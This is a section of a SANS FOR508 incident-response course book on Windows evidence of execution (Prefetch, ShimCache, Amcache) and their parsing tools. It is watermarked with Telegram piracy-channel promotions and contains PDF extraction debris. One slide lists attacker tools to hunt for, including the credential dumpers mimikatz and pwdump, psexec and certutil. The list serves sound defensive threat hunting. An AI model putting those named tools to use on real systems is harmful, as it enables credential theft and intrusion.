REMnux® is a registered trademark of Zeltser Security Crop. Used with permission.
VMware Workstation Pro®, VMWare Workstation Player®, VMWare Fusion®, and VMware Fusion Pro® are registered
trademarks of VMware, Inc. Used with permission.
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA.
Courseware licensed to User under this Agreement may be subject to export laws and regulations of the United States of
America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S.
Office of Foreign Assets Control within the U.S. Treasury Department (“OFAC”), or (ii) denied party list maintained by the U.S.
Bureau of Industry and Security within the U.S. Department of Commerce (“BIS”). User agrees to not allow access to any
Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulations.
User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and
recordkeeping required by OFAC, BIS or other governmental agency.
All reference links are operational in the browser-based delivery of the electronic workbook.

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

FOR508_2_I01_01

FOR508.2

Advanced Incident Response,Threat Hunting, and Digital Forensics

Intrusion Analysis

© 2023 SANS Institute | All Rights Reserved | Version I01_01

Welcome to Section 2.

Rob Lee
rlee@sans.org
https://twitter.com/robtlee
https://twitter.com/sansforensics

.

Author Team:

Chad Tilbury
ctilbury@sans.org
https://twitter.com/chadtilbury
Mike Pilkington
mpilkington@sans.org
https://twitter.com/mikepilkington

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

1

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

2

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Intrusion Analysis Agenda

Advanced Evidence of Execution
Event Log Analysis for Responders and Hunters
Lateral Movement Adversary Tactics
Command Line, PowerShell, and WMI Analysis
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

3

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

3

FOR508 Intrusion Methodology Roadmap
1

2

3

Threat Hunting & Assessment
Collection and analysis at scale across the
enterprise. Begin identification and scoping.

Triage Collection & Analysis
Targeted data acquisition to validate findings
and develop threat intelligence.

Deep-Dive Forensics
In-depth analysis on systems and malware to
further identify tradecraft and build IOCs.

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Your journey through FOR508 has been designed to follow a standard workflow for performing threat hunting,
compromise assessments, and incident response activities. The roadmap we will use in this class follows:

.

Threat Hunting & Assessment
We will start our process by looking at the network using tools that can scale collection and analysis, focusing
on occurrence stacking and outlier analysis. Most attendees have thousands of endpoints necessitating broad
scoping techniques at the start of an investigation.
Triage Collection & Analysis
As systems of interest are identified, we will perform targeted triage collection to acquire a deeper
understanding of attacker activity. Triage data can include traditional forensic artifacts like application
execution data, file system information, and in-memory artifacts such as process trees.
Deep-Dive Forensics
Finally, we will reserve our limited analyst time for performing deep-dive forensics on only a handful of
systems having the best chance to help us understand attacker tools and tradecraft and craft better indicators to
assist with scoping additional compromised systems.

4

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

4

Advanced Evidence of
Execution

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

5

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

5

Program

Execution

Review: Windows Prefetch

Prefetch Available in all Windows Workstation OS
• Provides application execution data
• Executable name, execution time(s), and execution count
Increases performance of system by pre-loading code pages
• Cache manager monitors “helper” files, recording them in the .pf file.

•

Location: C:\Windows\Prefetch
• <Exe name>-<Hash>.pf (Example: CHROME.EXE-46AA1511.pf)
• Hash calculated based on <dir> path of executable and the
command line options of certain programs (e.g., svchost.exe)
• 1024 prefetch files in Win8+ (limited to 128 files on Win7 and earlier)
• Prefetch files in Win10 and 11 are now compressed
FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

.

Prefetching is a process in which the operating system loads key pieces of data and code from disk into memory
before it is needed. The Prefetch directory is populated with a .pf file after the first time an application is
executed. The cache manager monitors all files and directories referenced for each application and records them
into the corresponding .pf file. On Windows 7 and before, the Prefetch directory is limited to 128 files. On
Windows 8 and above, there can be up to 1,024 files waiting for you in the Prefetch folder.
Windows workstation operating systems (not servers) have prefetching on by default to improve system
performance. However, prefetching can be turned off and we have witnessed Windows 7 machines with solid
state drives (SSD) with prefetching disabled. This does not appear to be the case for newer Windows operating
systems.
Forensic value of prefetch files
Each prefetch filename is a combination of the executable file name, followed by a dash and the hexadecimal
representation of a hash of the file's path.[1] Prefetch files indicate application execution. Embedded within each
prefetch file is the total number of times an application has been executed, the original path of execution, and the
last time of execution. Starting with Windows 8 and continuing through Windows 11, up to eight execution times
are available inside the prefetch file. When combined with the file system creation time of the prefetch file itself,
this can provide a total of nine run times per application.
Keep an eye out for multiple prefetch files with the same executable name. For most applications, this would
indicate two executables with the same name were run from different locations. As an example, if you were to
see multiple prefetch files for cmd.exe it might indicate a file named cmd.exe was executed from somewhere
outside of the standard C:\Windows\System32 folder and that “new” cmd.exe might turn into a valuable finding!
There are some exceptions to this rule. For Windows “hosting” applications, such as svchost, dllhost,
backgroundtaskhost, and rundll32, the hash value at the end of each prefetch file is calculated based on the full
path and any command line arguments.[1] Thus, it is normal for some executables to have multiple prefetch files.
As an example, you will almost always see multiple prefetch files for svchost.exe because it is normally run with
many different command line arguments.

6

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

6

Pro tip: Running live response tools on a target system will cause new prefetch files to be created for those live
response executables. Each system has a limited number of prefetch files so this can result in the deletion of the
oldest prefetch files. Thus, it is often a good idea to prioritize the collection of the prefetch directory to ensure
important evidence is not lost.
Two different registry keys control whether Prefetch is enabled or disabled. If you do not find Prefetch data present
on a workstation, these keys should be audited:[2]
SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\
PrefetchParameters
Audit the EnablePrefetcher value:
0 = Disabled
1 = Application launch prefetching enabled
2 = Boot prefetching enabled
3 = Application launch and boot enabled
SYSTEM\CurrentControlSet\Services\SysMain
Audit the Start value:
0-2 = Automatic Start
3 = Manual Start
4 = Disabled
Some versions of Windows also use the Prefetch folder to store something called SuperFetch. SuperFetch is
stored in files named like Ag*.db (AgAppLaunch.db, AgRobust.db, etc.). Few tools parse
SuperFetch data and it is often duplicative of Prefetch information. Should you ever need to dig deeper, a blog
post on parsing SuperFetch is referenced below.[3]

.

[1] Prefetch Hash Calculator: https://for508.com/rlhjb
[2] Disabling Prefetch - Microsoft Docs: https://for508.com/dv689
[3] What is New in Windows Application Execution: https://for508.com/wu15h

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

7

Review: Prefetch Analysis: First/Last Execution
Date/Time .exe was first executed
• CREATION DATE of .pf file (~ -10 seconds)

Date/Time .exe was last executed
• MODIFICATION DATE of .pf file (~-10 seconds)
• Last time of execution stored inside the .pf file as well
• Windows 8+ embeds the last eight execution times in .pf file

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

In addition to the embedded timestamps found within the prefetch file, we can leverage the file system
timestamps for each prefetch file to determine a program’s first and last time of execution.
Date/Time .exe was first executed: Creation date of .pf file (~ -10 seconds)

.

Date/Time .exe last executed: Last modification date of .pf file (~ -10 seconds)
(Last execution time(s) are also embedded in .pf file)
We often caveat the “first time of execution” by saying the “first time we know of the file being executed”. This
is because the number of prefetch entries is limited (128 .pf files on Win7, 1024 on Win8+) and if an application
has not been executed recently, the prefetch file for the application may age out and be deleted from the Prefetch
folder. If the application is executed again after its original prefetch file was removed, a new prefetch file (.pf)
will be created for it and assigned a new creation time. We deal with this kind of imperfect information all the
time in forensics and using other application execution artifacts can help us cross-reference the times to get a
better idea of the earliest known execution for an application.
An additional step is required when using file system timestamps to determine first and last time of execution.
These times typically do not get written until 10 seconds AFTER execution. This is because the prefetcher
service is watching everything the application touches within the first 10 seconds of execution and storing that
information inside of the .pf file. Hence, the file doesn’t get created or modified until 10 seconds after each
execution. Please note this is only an approximation and sometimes the embedded timestamps within the .pf file
will indicate a difference of less than ten seconds (imagine a smaller application that quickly finishes loading).
Subtracting ~10 seconds is only necessary for file system timestamps and not for the embedded timestamps we
will be parsing with our tool in the next slide.
Pro tip: Just because a .pf was created, it does NOT mean that the program was successful in execution. Many
“broken” programs that attempt execution will still be assigned a .pf file. Other artifacts related to evidence of
execution can be used to verify what prefetch is telling us.

8

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

8

Prefetch File Analysis: PECmd.exe (1)
• PECmd.exe: Prefetch Explorer Command Line edition
• By SANS Instructor Eric Zimmerman

C:\> PECmd.exe –f SDELETE.EXE-2288BD2E.PF

(SINGLE .PF PARSING)

C:\> PECmd.exe –d “E:\[root]\Windows\Prefetch” --csv “G:\cases” –q

(DIR PARSING)

PECmd.exe -d “<dir of PF files>” --csv “<dir>” -q
-d “<dir of PF files>”
-f “<filename>”
-q
-k
--csv “<dir>”

= Dir to recursively process
= File to process
= Quiet Output; use w/ --csv
= Comma Separated Keywords
= Dir to save CSV (tab separated)

--csvf name

= Filename to save CSV

--html “<dir>”

= Dir to save html
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

9

PECmd.exe has similar options to other Eric Zimmerman tools.[1] Specifying either -f or –d will process a
single prefetch file or a directory of files (recursively) respectively.

.

When reviewing PECmd output, you may notice certain lines are colorized, namely those containing .exe
(including the full path of the application being investigated) and any lines containing “temp” or “tmp.” This
highlighting of interesting lines can be extended with your own list of keywords. The -k switch allows you to
supply a comma-separated list of values you want to highlight in filenames and/or directories. When using this
feature, be sure to surround the list with double quotes (i.e., -k “SYSWOW64,APPDATA”).
The contents of Prefetch files have been in a compressed format since the introduction of Windows 8. PECmd
uses the Windows API to decompress these files, and hence, you must run PECmd.exe on at least Windows 8
in order to process the new Prefetch file format.
[1] Download PECmd: https://for508.com/8t6pb
USAGE:[1]
Author: Eric Zimmerman (saericzimmerman@gmail.com)
GitHub - EricZimmerman/PECmd: Prefetch Explorer Command Line http://for508.com/5hyao
d
f
k

Directory to recursively process. Either this or -f is required
File to process. Either this or -d is required
Comma-separated list of keywords to highlight in output. By default, 'temp' and 'tmp' are
highlighted. Any additional keywords will be added to these
Do not dump full details about each file processed. Speeds up processing when using --json or –
csv

q

json
csv
html
pretty

Directory to save json representation to. Use --pretty for a more human-readable layout
Directory to save CSV (tab separated) results to. Be sure to include the full path in double quotes
Directory to save xhtml formatted results to. Be sure to include the full path in double quotes
When exporting to json, use a more human-readable layout
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

9

dt
mp

The custom date/time format to use when displaying timestamps.
When true, display higher precision for timestamps. Default is false

Examples: PECmd.exe -f "C:\Temp\CALC.EXE-3FBEF7FD.pf"
PECmd.exe -f "C:\Temp\CALC.EXE-3FBEF7FD.pf" --json "D:\jsonOutput" --jsonpretty
PECmd.exe -d "C:\Temp" -k "system32, fonts"
PECmd.exe -d "C:\Temp" --csv "c:\temp" --local --json c:\temp\json
PECmd.exe -d "C:\Temp" --csv "c:\temp" --csvf foo.csv
PECmd.exe -d "C:\Windows\Prefetch"
Short options (single letter) are prefixed with a single dash. Long commands are prefixed with two dashes.

.

[1] Download PECmd: http://for508.com/8t6pb

10

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Prefetch File Analysis: PECmd.exe (2)

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

11

.

PECmd can provide Prefetch information in multiple formats. On the left of this slide, we see a single file parsed
(using the -f option). The first set of timestamps displayed are the timestamps of the actual .pf file. These may
not be relevant, depending on how the prefetch file was collected and more importantly how that collection affected
those timestamps. The executable name, prefetch hash, file size, and Prefetch version follow. Information below this
initial set is derived via parsing internal file metadata of the Prefetch file.
Prefetch file metadata includes a run count, last run timestamp (Windows 7 and before), or up to eight last run
timestamps (Windows 8+). A close look at the example on this slide shows the last run time matches the “Modified
on” time of the .pf file, indicating subtracting ten seconds from the .pf file creation and modified times is likely not
necessary in this example (remember the previous guidance of “approximately” -10 seconds). This could be because
sdelete is a simple application and finished execution quickly. Volume, folder, and file information follow the run
times. This information is recorded by the Prefetch service during the (approximate) first ten seconds of application
execution. While often uninteresting, this collection of data can unearth vital clues to interesting files accessed by
applications, helper files used by malware, user accounts, and alternative devices (volumes) in use.
If a directory of prefetch files is parsed (-d option), two files result. The standard output file parses each Prefetch
file’s metadata, placing it into CSV format, one file per line. This can be valuable for searching for items that have
been executed at certain times, or the greatest number of times. However, reviewing the extra file and volume
information can be challenging in this format. A good workflow might be finding an application of interest in the CSV
output and then parsing the individual Prefetch file again using -f to see the complete set of metadata available. The
second file created with the -d option is a timeline view. The timeline format extracts all of the embedded
timestamps for each Prefetch file, outputting a separate line for each and sorting them in chronological order.
Windows 8+ can have up to 1024 Prefetch files each storing up to eight timestamps, providing an exceptional
opportunity to identify temporal relationships between applications. In the example on this slide, you can see the
sdelete.exe wiping tool run eight times in quick succession, with some executions occurring within ten seconds
of each other. Additionally, other applications executed nearby could provide further context. Note that the timeline
view only takes into account the up to eight embedded Prefetch timestamps, potentially missing the additional
execution time derived from the creation time of the .pf file (first time executed).

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

11

.
12

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

13

Program

Execution

Application Compatibility: ShimCache

Purpose
• Application Compatibility checks to see if application needs to be “shimmed” (properti es applied) to run
application on current OS or via older OS parameters
• AppCompatCache tracks the executable file’s last modification date and file path
• Advanced: Applications will be shimmed again (w/ additional entry) if the file content is updated or
renamed. Good for proving application was moved, renamed, or timestamps were manipulated (If current
File’s Modified time ≠ ShimCache Modified time)

Locations
Cache (Win7+)

• SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatCache\AppCompat

Investigative Notes
• XP
• 96 entries
• Last Execution Time = Last Update Time
• Windows 7+
• 1,024 entries
• InsertFlag might indicate file execution

OS

File path Last Modified Date File Size Last Execution Time
✓

Insert Flag

XP

✓

✓

✓

Win7

✓

✓

✓

Win8/8.1

✓

✓

✓

Win10/11

✓

✓

✓

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Microsoft’s Application Compatibility Cache is designed to detect and remediate program compatibility
challenges when a program launches. A program might have been built to work on a previous version of
Windows, so to avoid compatibility issues, Microsoft employs a subsystem allowing a program to invoke
properties of different operating system versions.

.

This capability is sometimes used by regular users when they execute a program through the compatibility
wizard. The different compatibility modes are called “shims”, providing the colloquial term for this artifact,
ShimCache. By default, there are 100s of shims that exist on a standard Windows installation. Windows uses
this database to determine if a program needs shimming for compatibility.[1] One of the more interesting and
useful aspects of AppCompatCache is executables are checked and added to the registry regardless of whether
they need to be shimmed.
From a forensic perspective, we use information from the AppCompatCache to track application execution
including name, full path, and last modification time of the executable. On Windows XP (32 bit), the database
also tracked file size and the last time executed. [2]
AppCompatCache is stored in the registry and can be found in the SYSTEM hive:
Windows 7+
• SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatCache\AppCompatC
ache
• Win7–11, Server 2008/2012/2016/2019/2022 = 1,024 entries
• InsertFlag gives some indication of execution, but it is not definitive
Windows XP
• SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatibility\AppCompa
tCache
• Limited to 96 entries
• Server 2003 up to 512 entries
14

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

14

When reviewing the output from the AppCompatCache, note the following:
1. The most recent events are on top (helpful since modern OS versions do not include execution time)
2. New entries are only written on shutdown (or reboot)
3. The InsertFlag does not guarantee the application executed (or did not execute)
The registry key containing AppCompatCache entries is only written on system shutdown. In Windows 10+, a
reboot will also cause the data to be committed to the registry. Prior to shutdown or a reboot, the applications
that have been shimmed exist only in memory. A consequence of this is applications executed or identified since
the last reboot will not be present in the current SYSTEM hive (the data is buffered in system memory).
One of the most useful capabilities of the AppCompatCache is if an attacker has removed their tools from the
system and was careful to also delete the corresponding prefetch (.pf) files, AppCompatCache entries might
provide some of the only clues the application existed. Interestingly, if the application is rewritten to disk (this
happens in some applications like psexec), modified, or renamed, the application will be shimmed again,
resulting in additional AppCompatCache entries. This is exceptionally helpful in determining if a file is renamed
after being downloaded to the host. The modification time saved in AppCompatCache can also be useful as a
comparison value when determining if time manipulation has occurred on an executable. If the last modified
time of the AppCompatCache entry is not the same as the actual application, the application likely had its last
modified time adjusted.
Starting with Windows Vista, the existence of an entry in the AppCompatCache registry key no longer proves
execution. Interestingly, executables can be recorded in AppCompatCache preemptively by the operating
system, even before execution. In our testing, this appears to be caused by folders containing executables being
viewed via Windows GUI applications like File Explorer. While this seems like it defeats the purpose of an
“application execution” artifact, it can be very valuable when someone downloads an executable or unzips a tool
folder without executing all of the contents. Where Prefetch would only record information on items explicitly
run, AppCompatCache could snapshot every item, providing a more comprehensive view to investigators and
leaking information that attackers might not want you to see.

.

A value in the data structure named “InsertFlag” debuted in Windows Vista and researchers found if the flag is
not set, the application did not execute.[3] The data structure format for this artifact changed in Windows 10 and
11; and was eventually rediscovered by Eric Zimmerman and added to his parsing tool. However, recent testing
indicates this artifact is unreliable. On modern systems, it is common to see executables with Prefetch
information proving execution while the AppCompatCache InsertFlag is still set to false. Even though many
tools label this value as “Execution”, our current recommendation is to treat it as an interesting data point, but
not as a definitive measure of whether something has (or has not) executed. It is possible that certain types of
applications and execution methods more reliably update the InsertFlag, but new research is needed.
Finally, note that you might have multiple AppCompatCache databases to review, one in each control set found
in the SYSTEM hive. When digging deep, this can sometimes provide even more historical data depending on
how Windows has used the different control sets. The active, and most up to date AppCompatCache entry can
be found on a running system by looking at the SYSTEM\CurrentControlSet key. Since this is a volatile key,
when examining an offline system, you need to determine the Current control set by looking at the Current
value in the SYSTEM\Select key.
[1] Secrets of the Application Compatibility Database (SDB) – Alex Ionescu: http://for508.com/g2msb
[2] Understanding Shims - Microsoft Docs: http://for508.com/cyh3t
[3] Leveraging the Application Compatibility Cache in Forensic Investigations: http://for508.com/7pnmg

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

15

AppCompatCache Execution History: AppCompatCacheParser

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

AppCompatCacheParser is written and maintained by SANS instructor Eric Zimmerman.[1] It can be used to
parse an offline SYSTEM hive or to collect data on a live, running system. It currently parses data from
Windows 7 and above systems.

.

If a SYSTEM hive is not given the -f switch, the running computer’s AppCompatCache value will be processed.
By default, all ControlSets in the SYSTEM hive are queried and processed, ensuring data existing in older
control sets is not missed.
USAGE:
c
d
f
t
csv
csvf
dt

The ControlSet to parse. Default is to extract all control sets
Debug mode
Full path to SYSTEM hive to process. If this option is not specified, the live Registry will be used
Sorts last modified timestamps in descending order (not recommended)
Directory to save results. Required
File name to save CSV formatted results to.
The custom date/time format to use when displaying timestamps

Another tool worth having in your toolkit is Mandiant’s ShimCacheParser.py. [2] It can operate on exported .reg
files (such as exports from reg.exe), which is a lightweight way to extract ShimCache from systems at scale.
[1] GitHub – AppCompatCacheParser: http://for508.com/tk6mb
[2] GitHub – ShimCacheParser: https://for508.com/l14xr

16

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

16

Program

Execution

Application Compatibility: Amcache.hve

Purpose
• One of the newest application execution artifacts, backported all the way to Win 7+
• Registry hive data structure brimming with system information

Location
• C:\Windows\AppCompat\Programs\Amcache.hve

Investigative Notes
• Tracks installed applications, loaded drivers, and unassociated ex ecutables
• Full path, file size, file modification time, compilation time, publisher metadata
• SHA1 hashes of executables and drivers are one of the most exciting features
• Entries can also be due to automated file discovery or program
installation and do NOT always indicate program execution
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

17

.

Beginning with Windows 8+ and recently backported to patched Windows 7 systems, Amcache.hve replaces
the older application execution artifact RecentFileCache.bcf. This new registry hive contains an exciting
amount of information useful for tracking executables and drivers. However, Microsoft has changed the
database massively at least four times in the short time it has been available. As an example, in Windows 8 this
artifact gave us information like first execution time, which is no longer available. Interestingly, Blanche Lagny
discovered the format is driven by DLL version and not operating system version (Win7, Win10, etc.). This
means the format you find is largely dependent on the patch level of the system. We will be covering the most
up-to-date version of the database but note the data structures you see might be radically different if the system
being investigated is on an older patch level. Ms. Lagny’s research document is currently the definitive resource
for both older and newer versions of this artifact and will be of great assistance should you find yourself looking
at an older version.[1]
Amcache tracks installed applications, programs executed, drivers loaded, and more. It provides full path
information, file size, publisher metadata for executables and loaded drivers, and several different timestamps.
What sets this artifact apart from nearly all the others is it also tracks the SHA1 hash for executables and drivers.
Amazingly, this is a rarity in forensic artifacts and can be of great value when trying to identify either known
goods (e.g., Microsoft files) or known bads (e.g., a renamed version of mimikatz.exe). There is one limitation:
SHA1 hashes are only valid for files less than 31,457,280 bytes (approximately 31.4 MB). [2] This is likely
an efficiency mechanism put in place by Microsoft to avoid hashing excessively large files. Luckily, 31MB is
quite large and most executables will be under the limit. Exceptions include software installation packages and
(sadly) some malware. There has been a recent trend in malware expanding its size because some security
products also have limitations on how large of a file they will analyze. Of course, everything comes at a cost,
and those same large executables could draw unnecessary attention from savvy analysts! Note that file size is
also captured by Amcache.
While we historically group Amcache under the “program execution” category, it is important to understand that
inclusion in this database does not necessarily indicate something was executed. Blanche Lagny found three
major categories of files tracked in the latest version:
1.

Executed (and shimmed) GUI applications
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

17

2.
3.

Executables and drivers that were copied as part of application execution
Executables present in one of the directories scanned by the Microsoft Compatibility Appraiser scheduled
task (Program Files, Program Files x86 and Desktop).

Notice only the first category has anything to do with execution and it only applies to GUI applications which
needed to be shimmed for application compatibility purposes. This is a small subset of the files tracked by
Amcache and can be difficult to discern since you must find these entries by process of elimination with the
other two categories. Our recommendation is to use this artifact as an indication of executable and driver
presence on the system and for all the wonderful metadata it tracks for each file. Other artifacts (such as
Prefetch) can be used to prove execution and execution times.

.

[1] Analysis of the Amcache v2 by Blanch Lagny (PDF): https://for508.com/m385y
[2] Nviso – Amcache Contains SHA-1 Hash – It Depends: https://for508.com/cuoae

18

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Parsing Amcache.hve: Auditing Executable Presence

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

19

.

The InventoryApplicationFile key is a good starting point when reviewing Amcache data. It contains subkeys
named per application, providing an easy means to identify executables of interest. The algorithm generating
the hash following each name has not been reversed but appears to be related to the full path of the executable.
You may see multiple keys with the same executable name, but present in different folders. As you find items
of interest, the values in each key provide additional information. The “FileID” value provides the SHA1 hash
that this artifact is famous for (minus the first four zeroes). “LowerCaseLongPath” has the full path
information, “Size” has file size, and the “LinkDate” value keeps the PE header compilation time (a value often
tracked in malware indicators of compromise).
For each executable tracked, there might be additional information within the InventoryApplication key within
the Amcache hive. This key tracks installed applications, so it will only contain a subset of what is tracked
within InventoryApplicationFile. But should you find a match, it contains useful information like installation
date (with a time granularity of one day) and more detailed publisher information. The two keys are matched
together via the “ProgramId” value. Each entry under InventoryApplication is named according to the
“ProgramId”, making it easy to associate.
Note that unlike previous versions of the Amcache.hve database (Windows 8-era), the last write times of the
registry keys rarely indicate execution time. Instead, this timestamp is largely related to when the Microsoft
Compatibility Appraiser scheduled task added information to the database. Entries in these keys do not
necessarily indicate execution, but they do indicate the executable was present on the system.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

19

.
20

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Parsing Amcache.hve: Auditing Installed Drivers

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

21

.

Loaded drivers become important when investigating systems potentially infected with advanced malware.
Drivers are used by a wide range of rootkits, bootkits, and security tool evasion capabilities in the wild. The
Amcache.hve InventoryDriverBinary key contains a wealth of useful information on drivers seen on the
system. Information is stored with one sub-key per driver, and we can look for anomalies based on known
good/bad hashes, the modification time of the driver (potentially matching with known timeframes of suspicious
activity), whether the driver was signed (on 64-bit systems all drivers should be signed), and any metadata
stored in the PE header of the driver.
The example in this slide is a classic example of something worth looking into. We have a driver with a strange
name in a non-standard folder with no driver metadata recorded. We could try to get a copy of the driver to look
at its digital signature (which apparently exists), compare its timestamp with other known activity, and check the
SHA1 hash of the driver with a database like VirusTotal to see if it has been already submitted for analysis. If
you did all these things, you would eventually find the driver is part of the F-Response forensics tool, but it sure
does look suspicious at first glance!

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

21

.
22

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Amcache Extraction Using AmcacheParser
amcacheparser.exe -i -f Amcache.hve --csv G:\<folder>

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

AmcacheParser is a program written by Eric Zimmerman.[1]

Data parsed (partial list)
•
•
•
•
•
•
•
•

.

By default, AmcacheParser will not extract file information for files that can be associated with Program entries,
only providing “unassociated” entries. To include full information on Programs and their associated files, use
the -i switch.

SHA-1
Full path
File size
File version number
File description and publisher
Last modified date
Compilation time
Language ID

AmcacheParser can also leverage allowlisting and blocklisting based on the SHA-1 of the file, a very interesting
feature if you have specific hashes, you are looking for across the Amcache hives of many systems.
[1] The latest version of AmcacheParser is available here: https://ericzimmerman.github.io/

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

23

23

Example Output from AmcacheParser (1)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

AmcacheParser outputs multiple .csv files for analysis. Microsoft continues to add additional data into each
new version of the Amcache.hve, and AmcacheParser attempts to parse out data from the most interesting keys.
Output filenames are largely consistent with the names of the original Amcache.hve keys, with a few
exceptions. The “Amcache_ProgramEntries” file contains data from the InventoryApplication key. The name
mismatch is due to this key being named differently in older versions of Amcache.hve. This file will contain
metadata on installed applications.
Data from the InventoryApplicationFile key is broken into two different files. This key arguably has the most
important information in it, and AmcacheParser divides the information into items that are “Associated” with
installed software and items that are “Unassociated” with known installed software. Both files contain useful
information, but the latter category is of particular interest when looking for anomalous executables. The
“UnassociatedFileEntries” file contains information on executables present on the system that may not have
been part of an installation package. If they are not associated, then where did they come from? Here we might
look for standalone binaries dropped on the system like wiping tools, credential dumpers or network scanning
tools.

24

© 2023 SANS Institute

.

24

Example Output from AmcacheParser (2)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

25

hi

de

The Amcache.hve file uses registry keys and values to store information on applications and drivers on the
system. We previously saw how we might parse the hive in a registry viewer, but with hundreds of items
tracked, it is much more efficient to use a tool like AmcacheParser to get the information into csv format so we
can analyze and filter it in a table.
On this slide, we see three of the most important output files from AmcacheParser:
Amcache_UnassociatedEntries, Amcache_DriverBinaries, and Amcache_ProgramEntries. There is a
wealth of information here, so filtering on important items like filenames, full path information, hashes, nonMicrosoft drivers, and, possibly, install dates will help narrow your focus and answer a variety of investigative
questions.

© 2023 SANS Institute

.

25

.
26

© 2023 SANS Institute

.

Automating Application Execution Analysis

• Application execution artifacts make excellent
candidates for stacking at scale
• Databases are relatively small and easy to collect
• Search across the enterprise for:
Malware 101: One/two letter executables, executions from
temp or $Recycle.Bin folders
Common tools: psexesvc.exe, wmic.exe, scrcons.exe,
certutil.exe, rar.exe, wsmprovhost.exe, whoami.exe, …
IOCs: Known malware, tool, and staging directories
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

27

.

Application execution artifacts have long been an important part of digital forensics because what is running on
a system provides a window into how it is being used. This is even more important in intrusion cases where
specific tools can give insight into activities like reconnaissance, credential dumping, and lateral movement. To
use these artifacts effectively during an intrusion, they need to be collected and analyzed at scale. This is easily
achievable because the databases required are relatively small, accessible, and easy to normalize. Artifacts like
shimcache have long been used very effectively as form of rapid triage.
The first challenge is getting the data, and this can be accomplished by agent-based tools or via collection
scripts. Analysis might begin by looking at well-known attack patterns. One or two letter executable names,
executions occurring from unusual folders such as the $Recycle.Bin or System Volume Information and
searching common malware names like pwdump or mimikatz are all good starts. When attackers are
performing reconnaissance and living off the land, they will be using built-in tools, but those tools might be rare
in certain parts of the network. Searching for psexec activity, command-line WMI with wmic.exe, reg.exe, or
schtasks.exe could pay dividends. And, of course, once you have knowledge of specific files and folders used
by an attacker, these indicators of compromise can quickly identify systems exhibiting those same attack
characteristics.

© 2023 SANS Institute

.

27

Scaling
S
caling Execution Analysis: appcompatprocessor.py (1)

• Toolset designed to perform scalable hunting of
ShimCache and Amcache artifacts
• Python and SQLite based
• Capable of ingesting data in many different formats
• Easy merging of ShimCache and Amcache artifacts

• Impressive set of analysis modules
• Regex searches + built-in library of common anomalies
• “Reconscan” to search for grouping of known recon tools
• Temporal correlations of execution activity
• Easy stacking with enrichment via SQL database

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

For those of you who are veteran incident responders, it is hard not to get excited about a tool like
appcompatprocessor.py.[1] You can imagine the tool forged in the heat of combat, designed to automate time
intensive processes. The premise of appcompatprocessor.py is simple, but its power comes from advanced
analytic features which can make short work of large data sets. Appcompatprocessor.py parses both
AppCompatCache (aka ShimCache) and Amcache artifacts, placing the results in a SQLite database. It supports
many different file formats, including raw SYSTEM and Amcache.hve registry files, output from the FireEye
ShimCacheParser.py script and even output from in-memory extraction of ShimCache. It will also accept input
